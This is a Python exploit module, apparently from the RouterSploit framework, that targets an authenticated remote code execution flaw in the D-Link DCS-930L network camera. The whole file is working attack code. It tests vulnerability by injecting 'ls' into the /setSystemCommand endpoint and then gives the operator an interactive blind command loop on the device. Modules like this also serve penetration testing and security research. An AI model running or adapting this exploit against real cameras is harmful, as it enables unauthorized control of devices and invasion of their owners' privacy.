from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DCS-930L Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on the device.
    """
    __info__ = {
        'name': 'D-Link DCS-930L Auth RCE',
        'description': 'Module exploits D-Link DCS-930L Remote Code Execution vulnerability which allows executing command on the device.',
        'authors': [
            'Nicholas Starke <nick[at]alephvoid.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/39437/',
        ],
        'devices': [
            'D-Link DCS-930L',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    username = exploits.Option('admin', 'Username to log in with')
    password = exploits.Option('', 'Password to log in with')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/setSystemCommand".format(self.target, self.port)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {"ReplySuccessPage": "docmd.htm",
                "ReplyErrorPage": "docmd.htm",
                "SystemCommand": cmd,
                "ConfigSystemCommand": "Save"}

        http_request(method="POST", url=url, headers=headers, data=data, auth=(self.username, self.password))
        return ""

    @mute
    def check(self):
        url = "{}:{}/setSystemCommand".format(self.target, self.port)
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {"ReplySuccessPage": "docmd.htm",
                "ReplyErrorPage": "docmd.htm",
                "SystemCommand": "ls",
                "ConfigSystemCommand": "Save"}

        response = http_request(method="POST", url=url, headers=headers, data=data, auth=(self.username, self.password))
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "ConfigSystemCommand" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
